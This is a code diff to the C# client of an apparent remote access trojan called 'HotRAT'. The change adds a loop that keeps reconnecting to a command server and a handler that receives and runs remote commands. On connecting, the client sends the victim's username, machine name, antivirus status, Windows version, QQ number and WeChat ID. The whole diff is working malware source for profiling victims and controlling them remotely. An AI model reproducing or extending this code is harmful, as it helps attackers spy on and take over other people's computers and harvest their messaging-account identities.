@@ -6,24 +6,48 @@ namespace HotRAT.Client
 {
     internal class Program
     {
+        private static bool _isRunning = true;
+        private static int _reconnectDelay = 5000;
+
         static async Task Main(string[] args)
         {
-            using var client = new TcpClient();
-            await client.ConnectAsync("localhost", 8080);
+            Console.CancelKeyPress += (sender, e) =>
+            {
+                _isRunning = false;
+                e.Cancel = true;
+            };
 
-            var proc = Process.GetCurrentProcess();
+            while (_isRunning)
+            {
+                try
+                {
+                    using var client = new TcpClient();
+                    await client.ConnectAsync("localhost", 8080);
+                    await HandleConnection(client);
+                }
+                catch
+                {
+                    Console.WriteLine($"重连");
+                    await Task.Delay(_reconnectDelay);
+                }
+            }
+        }
+
+        static async Task HandleConnection(TcpClient client)
+        {
             using var stream = client.GetStream();
+            var proc = Process.GetCurrentProcess();
             using var ms = new MemoryStream();
             using (var writer = new BinaryWriter(ms, Encoding.UTF8, true))
             {
-                writer.Write(Environment.UserName);               // UserName
-                writer.Write(Environment.MachineName);            // DeviceName
-                writer.Write(proc.ProcessName);                   // ProcessName
-                writer.Write(proc.Id);                            // PID
-                writer.Write(GetInfo.Detect());                   // Antivirus
-                writer.Write(GetInfo.GetWindowsVersion());        // WindowsVersion
-                writer.Write(GetInfo.GetQQNumber());              // QQNumber
-                writer.Write(GetInfo.GetWxID());                  // WxID
+                writer.Write(Environment.UserName);
+                writer.Write(Environment.MachineName);
+                writer.Write(proc.ProcessName);
+                writer.Write(proc.Id);
+                writer.Write(GetInfo.Detect());
+                writer.Write(GetInfo.GetWindowsVersion());
+                writer.Write(GetInfo.GetQQNumber());
+                writer.Write(GetInfo.GetWxID());
             }
 
             var data = ms.ToArray();
@@ -33,25 +57,29 @@ namespace HotRAT.Client
             await stream.WriteAsync(header, 0, header.Length);
             await stream.WriteAsync(typeByte, 0, typeByte.Length);
             await stream.WriteAsync(data, 0, data.Length);
-
-            while (true)
+            try
             {
-                var input = Console.ReadLine();
-                if (input == "exit")
+                while (_isRunning)
                 {
-                    break;
-                }
-                else
-                {
-                    var data2 = Encoding.UTF8.GetBytes(input);
-                    var header2 = BitConverter.GetBytes(data2.Length);
-                    var typeByte2 = new byte[] { 0x02 };
+                    var lengthBuffer = new byte[4];
+                    await stream.ReadAsync(lengthBuffer, 0, 4);
+                    int messageLength = BitConverter.ToInt32(lengthBuffer, 0);
 
-                    await stream.WriteAsync(header2, 0, header2.Length);
-                    await stream.WriteAsync(typeByte2, 0, typeByte2.Length);
-                    await stream.WriteAsync(data2, 0, data2.Length);
+                    var typeBuffer = new byte[1];
+                    await stream.ReadAsync(typeBuffer, 0, 1);
+                    byte messageType = typeBuffer[0];
+
+                    var messageBuffer = new byte[messageLength];
+                    await stream.ReadAsync(messageBuffer, 0, messageLength);
+
+                    if (messageType == 0x02)
+                    {
+                        string receivedMessage = Encoding.UTF8.GetString(messageBuffer);
+                        MessageHandle.Handle(receivedMessage, stream);
+                        Console.WriteLine($"收到消息: {receivedMessage}");
+                    }
                 }
-            }
+            }catch{}
         }
     }
 }
